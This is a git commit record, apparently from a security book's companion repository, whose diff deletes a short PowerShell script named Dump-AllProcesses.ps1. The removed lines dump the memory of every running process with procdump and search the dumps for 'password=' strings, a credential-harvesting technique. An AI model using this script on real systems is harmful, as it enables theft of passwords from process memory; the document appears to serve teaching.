7cf2e2047681acfd9f47b129e4fcf9c0a1dcac88
prachiss <prachis@packt.com>
2020-03-09 16:20:44 +0530

    Delete Dump-AllProcesses.ps1

--- Chapter 8/Dump-AllProcesses.ps1
+++
@@ -1,5 +0,0 @@
-Get-Process | % { 
-    procdump.exe -ma $_.Id } #make sure to install procdump from Systeinternals and have it in your path
-    gci *.dmp | % { strings.exe -n 17 $_.Name | 
-       Select-String "password=" | Out-File ($_.Name+".txt") 
-}
